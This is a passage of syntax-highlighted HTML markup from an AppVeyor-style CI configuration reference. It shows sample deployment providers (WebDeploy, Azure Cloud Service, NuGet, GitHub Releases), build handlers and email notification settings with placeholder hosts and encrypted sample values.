&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;WebDeploy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;http://www.deploy.com/myendpoint&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;mywebsite&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;eYKZKFkkEvFYWX6NfjZIVw==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ntlm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;remove_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app_offline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;do_not_use_checksum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;           &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# do not use check sum for comparing source and destination files. By default checksums are used.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;sync_retry_attempts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# sync attempts, max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;sync_retry_interval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;           &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# timeout between sync attempts, milliseconds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;aspnet_core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# artifact zip contains ASP.NET Core application&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;aspnet_core_force_restart&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# poke app&amp;#39;s web.config before deploy to force application restart&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_dirs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;\\App_Data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;web.config&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;branch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;platform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;x86&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Deploying to Azure Cloud Service&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;AzureCS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;subscription_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;fjZIVw==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;subscription_certificate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;eYKZKFkkEv...FYWX6NfjZIVw==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;storage_account_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;my_storage&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;storage_access_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ABcd==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;my_service&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;slot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Production&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;target_profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Cloud&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;MyPackage.cspkg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Deploying to NuGet feed&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;NuGet&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://my.nuget.server/feed&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;api_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;FYWX6NfjZIVw==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;symbol_server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://your.symbol.server/feed&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;MyPackage.nupkg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Deploy to GitHub Releases&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/.*\.nupkg/           # upload all NuGet packages to release assets&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;draft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;prerelease&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;branch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;master                # release from master branch only&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;APPVEYOR_REPO_TAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# deploy on tag push only&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Deploying to a named environment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Environment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;staging&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;branch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;staging&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;env_var1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;value1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;env_var2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;value2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run before deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_deploy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts to run after deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;after_deploy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to run your custom scripts instead of provider deployments&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;deploy_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# to disable deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#deploy: off&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#        global handlers          #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# on successful build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;do something&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# on build failure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_failure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;do something&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# after build failure or success&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_finish&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;do something&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#         notifications           #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;notifications&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Email&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Email&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;user1@email.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;user2@email.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;subject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Build {{status}}&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# optional&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{{message}}, {{commitId}}, ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# optional&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_build_status_changed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# HipChat&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
